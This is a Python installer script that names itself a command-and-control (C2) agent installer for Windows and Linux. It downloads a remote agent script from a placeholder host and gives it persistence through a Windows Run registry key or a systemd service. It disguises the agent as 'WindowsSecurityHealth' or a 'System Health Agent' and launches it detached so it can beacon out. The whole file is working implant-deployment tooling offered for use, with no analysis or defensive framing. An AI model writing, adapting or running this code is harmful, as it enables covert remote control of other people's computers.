#!/usr/bin/env python3
"""
install.py - C2 agent installer.

Windows (run as Administrator, or as standard user for per-user install):
    python install.py

Linux / Raspberry Pi (run as root):
    sudo python3 install.py

No external dependencies required.
"""
import os
import platform
import subprocess
import sys
import urllib.request

INIT_URL   = "https://init-yourid.yourdomain.com"
ENROLL_KEY = "your-enroll-key-here"
SVC_URL    = f"{INIT_URL}/svc.py?enroll={ENROLL_KEY}"

WIN_DIR_ADMIN = r"C:\ProgramData\WindowsHealthSvc"
WIN_DIR_USER  = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "WindowsHealthSvc")
WIN_KEY       = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
WIN_NAME      = "WindowsSecurityHealth"

LIN_DIR  = "/opt/windowshealthsvc"
LIN_SVC  = "/etc/systemd/system/agent.service"


def download(url, dest):
    print(f"[*] Downloading {url} ...")
    req = urllib.request.Request(url, headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            data = r.read()
    except Exception as e:
        print(f"[!] Download failed: {e}")
        sys.exit(1)
    with open(dest, "wb") as f:
        f.write(data)
    print(f"[+] Saved {len(data):,} bytes to {dest}")


def find_pythonw():
    candidate = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
    if os.path.exists(candidate):
        return candidate
    try:
        out = subprocess.run(["where", "pythonw"], capture_output=True, text=True)
        if out.returncode == 0:
            return out.stdout.strip().splitlines()[0]
    except Exception:
        pass
    return sys.executable


def install_windows():
    import ctypes
    import winreg

    is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    win_dir  = WIN_DIR_ADMIN if is_admin else WIN_DIR_USER
    hive     = winreg.HKEY_LOCAL_MACHINE if is_admin else winreg.HKEY_CURRENT_USER

    if is_admin:
        print("[*] Running as Administrator - using system-wide install.")
    else:
        print("[*] Running as standard user - using per-user install.")

    os.makedirs(win_dir, exist_ok=True)
    svc_path = os.path.join(win_dir, "svc.py")
    download(SVC_URL, svc_path)

    pythonw = find_pythonw()
    print(f"[*] Using Python: {pythonw}")

    reg_value = f'"{pythonw}" "{svc_path}"'
    try:
        key = winreg.OpenKey(hive, WIN_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, WIN_NAME, 0, winreg.REG_SZ, reg_value)
        winreg.CloseKey(key)
        hive_name = "HKLM" if is_admin else "HKCU"
        print(f"[+] Persistence: {hive_name}\\...\\Run -> {WIN_NAME}")
    except Exception as e:
        print(f"[!] Could not set Run key: {e}")

    try:
        subprocess.Popen(
            [pythonw, svc_path],
            creationflags=0x00000008 | 0x00000200 | 0x08000000,
            close_fds=True,
        )
        print("[+] Agent started (detached)")
    except Exception as e:
        print(f"[!] Could not start agent: {e}")

    print()
    print("[+] Install complete.")
    print(f"    Script:      {svc_path}")
    print(f"    Persistence: {'HKLM' if is_admin else 'HKCU'} Run > {WIN_NAME}")
    print(f"    Log:         {os.path.join(win_dir, 'svc.log')}")


def find_python3():
    for cmd in ["python3", "python"]:
        try:
            out = subprocess.run(["which", cmd], capture_output=True, text=True)
            if out.returncode == 0:
                return out.stdout.strip()
        except Exception:
            pass
    return sys.executable


def install_linux():
    if os.geteuid() != 0:
        print("[!] Please run with sudo.")
        sys.exit(1)

    os.makedirs(LIN_DIR, exist_ok=True)
    svc_path = os.path.join(LIN_DIR, "svc.py")
    download(SVC_URL, svc_path)
    os.chmod(svc_path, 0o755)

    python3 = find_python3()
    print(f"[*] Using Python: {python3}")

    with open(LIN_SVC, "w") as f:
        f.write(f"""[Unit]
Description=System Health Agent
After=network.target
Wants=network-online.target

[Service]
ExecStart={python3} {svc_path}
Restart=always
RestartSec=5
KillMode=process

[Install]
WantedBy=multi-user.target
""")
    print(f"[+] Systemd service written -> {LIN_SVC}")

    subprocess.run(["systemctl", "daemon-reload"], check=True)
    subprocess.run(["systemctl", "enable", "agent"], check=True)
    subprocess.run(["systemctl", "start",  "agent"], check=True)

    result = subprocess.run(["systemctl", "is-active", "agent"], capture_output=True, text=True)
    print(f"[+] Service status: {result.stdout.strip()}")

    print()
    print("[+] Install complete.")
    print(f"    Script:      {svc_path}")
    print(f"    Log:         {os.path.join(LIN_DIR, 'svc.log')}")
    print(f"    Manage:      systemctl start|stop|restart agent")


if __name__ == "__main__":
    print("=" * 50)
    print("  C2 Agent Installer")
    print(f"  OS: {platform.system()} {platform.release()}")
    print("=" * 50)
    print()

    if platform.system() == "Windows":
        install_windows()
    else:
        install_linux()

    print()
    print("[*] Agent will beacon within 5 seconds.")
